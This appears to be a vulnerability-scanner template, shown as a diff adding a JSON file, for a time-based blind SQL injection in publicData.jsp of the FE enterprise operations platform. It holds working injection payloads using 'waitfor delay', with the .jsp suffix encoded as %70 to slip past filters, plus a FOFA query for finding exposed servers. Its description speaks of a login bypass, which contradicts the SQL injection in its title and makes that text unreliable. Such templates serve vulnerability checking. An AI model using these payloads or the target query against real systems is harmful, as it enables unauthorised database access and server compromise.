@@ -1,0 +1,60 @@
+{
+  "product": "FE企业运营管理平台",
+  "vul_name": "飞企互联 FE企业运营管理平台 publicData.jsp SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "飞企互联-FE企业运营管理平台 2.ln接口处存在登录绕过漏洞，未授权的攻击者可构造恶意的url访问页面，可直接进入后台管理页面，获取敏感信息，进一步利用可控制整个服务器。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"飞企互联-FE企业运营管理平台\" || app=\"FE-协作平台\""
+  },
+  "protocol": "http",
+  "link": "https://download.csdn.net/blog/column/12593339/136523491",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db=';waitfor+delay+'0:0:8'--"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "time": {
+              "check": ">=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db=';waitfor+delay+'0:0:0'--"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "time": {
+              "check": "<=",
+              "num": 7
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
